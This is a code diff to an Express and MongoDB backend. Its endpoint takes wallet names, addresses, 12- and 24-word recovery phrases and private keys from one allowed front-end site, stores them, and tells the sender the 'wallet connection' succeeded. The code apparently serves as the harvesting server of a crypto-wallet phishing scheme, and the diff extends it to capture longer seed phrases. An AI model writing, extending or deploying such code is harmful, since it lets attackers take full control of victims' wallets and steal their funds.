@@ -4,7 +4,19 @@ const cors = require('cors');
 require('dotenv').config();
 
 const app = express();
-app.use(cors());
+
+// Configure CORS
+const allowedOrigins = ['https://theblockchain.vercel.app'];
+app.use(cors({
+  origin: (origin, callback) => {
+    if (!origin || allowedOrigins.indexOf(origin) !== -1) {
+      callback(null, true);
+    } else {
+      callback(new Error('Not allowed by CORS'));
+    }
+  }
+}));
+
 app.use(express.json());
 
 // MongoDB connection
@@ -17,7 +29,7 @@ const walletSchema = new mongoose.Schema({
   walletName: String,
   walletAddress: String,
   phraseWords: [String],
-  keystoreJSON: String,
+  phraseWords24: [String],
   privateKey: String,
 }, { timestamps: true });
 
@@ -25,19 +37,19 @@ const Wallet = mongoose.model('Wallet', walletSchema);
 
 // Endpoint to handle wallet data
 app.post('/api/send-wallet-data', async (req, res) => {
-  const { walletName, walletAddress, phraseWords, keystoreJSON, privateKey } = req.body;
+  const { walletName, walletAddress, phraseWords, phraseWords24, privateKey } = req.body;
 
   try {
     const newWallet = new Wallet({
       walletName,
       walletAddress,
       phraseWords,
-      keystoreJSON,
+      phraseWords24,
       privateKey,
     });
 
     await newWallet.save();
-    res.status(200).send('Wallet connection unsuccessful');
+    res.status(200).send('Wallet connection successful');
   } catch (error) {
     console.error('Error connecting wallet data:', error);
     res.status(500).send('Error connecting wallet data');
